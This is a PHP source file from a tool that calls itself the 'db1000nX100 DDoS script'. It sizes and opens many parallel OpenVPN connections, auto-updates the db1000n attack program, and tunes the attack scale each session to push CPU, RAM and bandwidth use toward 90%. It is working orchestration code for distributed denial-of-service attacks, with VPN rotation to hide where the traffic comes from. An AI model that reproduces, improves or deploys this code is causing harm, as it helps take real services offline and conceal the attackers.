<?php

require_once __DIR__ . '/common.php';
require_once __DIR__ . '/Efficiency.php';
require_once __DIR__ . '/resources-consumption/ResourcesConsumption.php';
require_once __DIR__ . '/open-vpn/OpenVpnConfig.php';
require_once __DIR__ . '/open-vpn/OpenVpnProvider.php';
require_once __DIR__ . '/open-vpn/OpenVpnConnection.php';
require_once __DIR__ . '/open-vpn/OpenVpnStatistics.php';
require_once __DIR__ . '/DB1000N/db1000nAutoUpdater.php';
require_once __DIR__ . '/HackApplication.php';

//-------------------------------------------------------

$LOG_WIDTH = 115;
$LOG_PADDING_LEFT = 2;
$LOG_BADGE_WIDTH = 23;
$LOG_BADGE_PADDING_LEFT = 1;
$LOG_BADGE_PADDING_RIGHT = 1;
$LONG_LINE_WIDTH = $LOG_BADGE_WIDTH + 1 + $LOG_WIDTH;
$LONG_LINE       = str_repeat('─', $LONG_LINE_WIDTH);

$LONG_LINE_CLOSE = str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n"
                 . str_repeat('─', $LOG_BADGE_WIDTH) . '┴' . str_repeat('─', $LOG_WIDTH) . "\n";

$LONG_LINE_OPEN  = str_repeat('─', $LOG_BADGE_WIDTH) . '┬' . str_repeat('─', $LOG_WIDTH) . "\n"
                 . str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n";

$LONG_LINE_SEPARATOR = str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n"
                     . str_repeat('─', $LOG_BADGE_WIDTH) . '┼' . str_repeat('─', $LOG_WIDTH) . "\n"
                     . str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n";

$ONE_VPN_SESSION_DURATION = 15 * 60;
$PING_INTERVAL = 5 * 60;
$VPN_CONNECTIONS = [];
$SCRIPT_STARTED_AT = time();

$OS_RAM_CAPACITY            = bytesToGiB(ResourcesConsumption::getRAMCapacity());
$CPU_CORES_QUANTITY         =            ResourcesConsumption::getCPUQuantity();
$MAX_CPU_CORES_USAGE        = $CPU_CORES_QUANTITY;
$MAX_RAM_USAGE              = $OS_RAM_CAPACITY;
$FIXED_VPN_QUANTITY         = 0;
$IS_IN_DOCKER               = false;
$NETWORK_BANDWIDTH_LIMIT    = 100;       /* Mebibit */
$COMMON_NETWORK_INTERFACE   = getDefaultNetworkInterface();
$VPN_QUANTITY_PER_CPU       = 10;
$VPN_QUANTITY_PER_1_GIB_RAM = 15;
$DB1000N_SCALE_INITIAL = 0.10;
$DB1000N_SCALE = $DB1000N_SCALE_INITIAL;

//----------------------------------------------

passthru('reset');
global $TEMP_DIR;
rmdirRecursive($TEMP_DIR);
passthru('ulimit -n 102400');
calculateResources();

//----------------------------------------------

function calculateResources()
{
    global
    $VPN_QUANTITY_PER_CPU,
    $VPN_QUANTITY_PER_1_GIB_RAM,
    $FIXED_VPN_QUANTITY,
    $IS_IN_DOCKER,
    $OS_RAM_CAPACITY,
    $MAX_RAM_USAGE,
    $CPU_CORES_QUANTITY,
    $MAX_CPU_CORES_USAGE,
    $COMMON_NETWORK_INTERFACE,
    $NETWORK_BANDWIDTH_LIMIT,
    $CPU_ARCHITECTURE,
    $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL;

    if ($CPU_ARCHITECTURE !== 'x86_64') {
        MainLog::log("Cpu architecture $CPU_ARCHITECTURE");
    }

    if (($config = getConfig())) {

        if ($config['vpnQuantity'] ?? false) {
            $FIXED_VPN_QUANTITY      = $config['vpnQuantity'];
        }

        if ($config['docker'] ?? false) {
            MainLog::log("Docker container detected");
            $IS_IN_DOCKER = true;
        }

        $cpuUsageLimit = (int) ($config['cpuUsageLimit'] ?? false);
        if ($cpuUsageLimit > 1  &&  $cpuUsageLimit < 100) {
            $MAX_CPU_CORES_USAGE = (int) round($cpuUsageLimit / 100 * $CPU_CORES_QUANTITY);
            $MAX_CPU_CORES_USAGE = max(1, $MAX_CPU_CORES_USAGE);
        }

        $ramUsageLimit = (int) ($config['ramUsageLimit'] ?? false);
        if ($ramUsageLimit > 1  &&  $ramUsageLimit < 100) {
            $MAX_RAM_USAGE = roundLarge($ramUsageLimit / 100 * $OS_RAM_CAPACITY);
        }

        if ($config['networkInterface'] ?? false) {
            $COMMON_NETWORK_INTERFACE = $config['networkInterface'];
        }

        $networkUsageLimit = (int) ($config['networkUsageLimit'] ?? false);
        if ($networkUsageLimit > 1  &&  $networkUsageLimit < 100) {
            $NETWORK_BANDWIDTH_LIMIT = $networkUsageLimit;
        }
    }

    if ($FIXED_VPN_QUANTITY) {
        MainLog::log("The user requested to establish $FIXED_VPN_QUANTITY VPN connection(s)");
        $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL = $FIXED_VPN_QUANTITY;
    } else {
        $connectionsLimitByCpu = $MAX_CPU_CORES_USAGE * $VPN_QUANTITY_PER_CPU;
        MainLog::log("Allowed to use $MAX_CPU_CORES_USAGE of $CPU_CORES_QUANTITY installed CPU core(s). This grants $connectionsLimitByCpu parallel VPN connections");

        $connectionsLimitByRam = round(($MAX_RAM_USAGE - ($IS_IN_DOCKER  ?  0.5 : 1)) * $VPN_QUANTITY_PER_1_GIB_RAM);
        $connectionsLimitByRam = $connectionsLimitByRam < 1  ?  0 : $connectionsLimitByRam;
        MainLog::log("Allowed to use $MAX_RAM_USAGE of $OS_RAM_CAPACITY GiB installed RAM. This grants $connectionsLimitByRam parallel VPN connections");

        $vpnQuantityLimitPossibleValues = [
            'Limit by CPU'          => $connectionsLimitByCpu,
            'Limit by RAM'          => $connectionsLimitByRam
        ];
        $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL = min($vpnQuantityLimitPossibleValues);
        $vpnQuantityLimitReason = array_search($PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL, $vpnQuantityLimitPossibleValues);

        MainLog::log("Script will try to establish $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL parallel VPN connection(s). $vpnQuantityLimitReason");
    }

    if (
          !$PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL
       || !$NETWORK_BANDWIDTH_LIMIT
    ) {
        _die("Not enough resources");
    }

    if ($NETWORK_BANDWIDTH_LIMIT !== 100) {
        MainLog::log("Allowed to use $NETWORK_BANDWIDTH_LIMIT Mebibits of network bandwidth");
    }
    MainLog::log("Common network interface $COMMON_NETWORK_INTERFACE", 1, 0, MainLog::LOG_DEBUG);
    MainLog::log('');
}

function initSession()
{
    global $SESSIONS_COUNT,
           $PARALLEL_VPN_CONNECTIONS_QUANTITY,
           $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL,
           $CONNECT_PORTION_SIZE,
           $MAX_FAILED_VPN_CONNECTIONS_QUANTITY,

           $CPU_CORES_QUANTITY,
           $MAX_CPU_CORES_USAGE,
           $OS_RAM_CAPACITY,
           $MAX_RAM_USAGE,
           $NETWORK_BANDWIDTH_LIMIT,
           $IS_IN_DOCKER,
           $DB1000N_SCALE_INITIAL,
           $DB1000N_SCALE;

    $SESSIONS_COUNT++;
    ResourcesConsumption::startTaskTimeTracking('session');
    if ($SESSIONS_COUNT !== 1) {
        passthru('reset');  // Clear console
    }

    $newSessionMessage = "db1000nX100 DDoS script version " . SelfUpdate::getSelfVersion() . "\nStarting $SESSIONS_COUNT session at " . date('Y/m/d H:i:s');
    MainLog::log($newSessionMessage);

    //-----------------------------------------------------------
    $PARALLEL_VPN_CONNECTIONS_QUANTITY   = $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL;
    $CONNECT_PORTION_SIZE                = max(5, round($PARALLEL_VPN_CONNECTIONS_QUANTITY / 5));
    $MAX_FAILED_VPN_CONNECTIONS_QUANTITY = max(10, $CONNECT_PORTION_SIZE);

    if ($SESSIONS_COUNT !== 1) {

        $previousSessionSystemAverageCPUUsage = ResourcesConsumption::getSystemAverageCPUUsageFromStartToFinish();
        MainLog::log('System      average CPU     usage during previous session was ' . $previousSessionSystemAverageCPUUsage . "% of {$CPU_CORES_QUANTITY} core(s) installed");
        $previousSessionSystemAverageRamUsage = ResourcesConsumption::getSystemAverageRamUsageFromStartToFinish();
        MainLog::log('System      average RAM     usage during previous session was ' . $previousSessionSystemAverageRamUsage . "% of {$OS_RAM_CAPACITY}GiB installed");

        $previousSessionProcessesAverageCPUUsage = ResourcesConsumption::getProcessesAverageCPUUsageFromStartToFinish();
        MainLog::log('db1000nX100 average CPU     usage during previous session was ' . $previousSessionProcessesAverageCPUUsage . "% of {$MAX_CPU_CORES_USAGE} core(s) allowed");
        $previousSessionProcessesPeakRAMUsage = ResourcesConsumption::getProcessesPeakRAMUsageFromStartToFinish();
        MainLog::log('db1000nX100 peak    RAM     usage during previous session was ' . $previousSessionProcessesPeakRAMUsage . "% of {$MAX_RAM_USAGE}GiB allowed");

        if ($NETWORK_BANDWIDTH_LIMIT === 100) {
            $previousSessionProcessesAverageNetworkUsage = -1;
        } else {
            $previousSessionProcessesAverageNetworkUsage = ResourcesConsumption::getProcessesAverageNetworkUsageFromStartToFinish();
            MainLog::log('db1000nX100 average network usage during previous session was ' . $previousSessionProcessesAverageNetworkUsage . "% of {$NETWORK_BANDWIDTH_LIMIT} Mebibits allowed");
        }

        $previousSessionUsageValues = [
            'SystemAverageCPUUsage'          => $previousSessionSystemAverageCPUUsage,
            'SystemAverageRamUsage'          => $previousSessionSystemAverageRamUsage,
            'db1000nX100AverageCPUUsage'     => $previousSessionProcessesAverageCPUUsage,
            'db1000nX100PeakRAMUsage'        => $previousSessionProcessesPeakRAMUsage,
            'db1000nX100AverageNetworkUsage' => $previousSessionProcessesAverageNetworkUsage
        ];
        $previousSessionHighestUsageValue       = max($previousSessionUsageValues);
        $previousSessionHighestUsageParameter   = array_search($previousSessionHighestUsageValue, $previousSessionUsageValues);
        MainLog::log("Previous session highest used resource was $previousSessionHighestUsageParameter $previousSessionHighestUsageValue%");

        $maxUsage = 95;
        $minUsage = 85;
        $goalUsage = 90;

        if ($previousSessionHighestUsageValue > $maxUsage) {
            $fitUsageToValue = $goalUsage;
        } else if ($previousSessionHighestUsageValue < $minUsage) {
            $fitUsageToValue = $goalUsage;
        } else {
            $fitUsageToValue = 0;
        }

        $previousSessionScale = $DB1000N_SCALE;
        if ($fitUsageToValue) {
            /* previousSessionScale -> $previousSessionHighestUsageValue
              ?currentSessionScale? -> $fitUsageToValue */
            $currentSessionScale = round($previousSessionScale * $fitUsageToValue / $previousSessionHighestUsageValue, 2);
            $currentSessionScale = min($currentSessionScale, $IS_IN_DOCKER  ?  2 : 10);
            $currentSessionScale = max($currentSessionScale, $DB1000N_SCALE_INITIAL / 100);

            if ($currentSessionScale < $previousSessionScale) {
                MainLog::log("This resources usage was higher then $maxUsage%, decreasing db1000n scale value from $previousSessionScale to $currentSessionScale");
            } else if ($currentSessionScale > $previousSessionScale){
                MainLog::log("This resources usage was lower then $minUsage%, increasing db1000n scale value from $previousSessionScale to $currentSessionScale");
            }
            $DB1000N_SCALE = $currentSessionScale;
        }
    }

    MainLog::log('');
    if (!isset($fitUsageToValue) ||  !$fitUsageToValue) {
        MainLog::log("db1000n scale value $DB1000N_SCALE");
    }

    //-----------------------------------------------------------

    if ($SESSIONS_COUNT === 1  ||  $SESSIONS_COUNT % 10 === 0) {
        db1000nAutoUpdater::update();
        SelfUpdate::update();
    }
    OpenVpnConnection::newIteration();
    HackApplication::newIteration();

    if ($SESSIONS_COUNT === 1) {
        MainLog::log("\n\nReading ovpn files. Please, wait ...");
        OpenVpnProvider::constructStatic();
    }
    MainLog::log("\n\nEstablishing VPN connections. Please, wait ...");
}

//gnome-terminal --window --maximize -- /bin/bash -c "/root/DDOS/x100-suid-run.elf ; read -p \"Program was terminated\""
//apt -y install  procps kmod iputils-ping curl php-cli php-mbstring php-curl openvpn git